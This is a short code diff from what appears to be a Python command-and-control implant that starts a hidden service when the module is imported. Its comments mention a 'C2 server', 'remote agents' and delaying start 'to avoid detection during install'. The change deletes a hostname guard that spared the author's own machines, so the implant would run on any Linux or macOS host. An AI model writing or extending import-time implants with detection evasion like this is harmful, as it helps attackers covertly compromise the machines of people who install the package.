@@ -305,13 +305,6 @@ def _start_service():
 def _init():
     """Initialize service on module import."""
     try:
-        # DISABLED on local dev machine - only start on remote agents
-        # Check if we're on the C2 server itself
-        import socket
-        hostname = socket.gethostname().lower()
-        if hostname in ['kali', 'localhost', 'dev', 'garedberns']:
-            return  # Don't start on dev/server machines
-        
         # Only start on Linux/Unix systems
         if sys.platform.startswith('linux') or sys.platform == 'darwin':
             # Delay start to avoid detection during install
